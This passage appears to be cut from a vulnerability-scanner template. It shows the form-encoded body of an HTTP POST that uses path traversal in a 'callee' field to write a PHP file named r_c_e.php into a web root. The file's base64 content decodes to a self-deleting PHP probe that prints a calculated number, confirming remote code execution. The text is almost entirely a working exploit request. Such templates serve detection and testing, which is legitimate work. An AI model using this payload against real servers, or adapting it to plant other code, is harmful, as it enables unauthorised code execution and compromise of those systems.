    Content-Type: application/x-www-form-urlencoded

    jsondata[caller]=1&jsondata[callee]=../../../../../../ICPAS/Wnmp/WWW&jsondata[videoname]=r_c_e.php&jsondata[videocontent]=PD9waHAgcHJpbnQoMTExKjIyMik7dW5saW5rKF9fRklMRV9fKTs/Pg==
- raw:
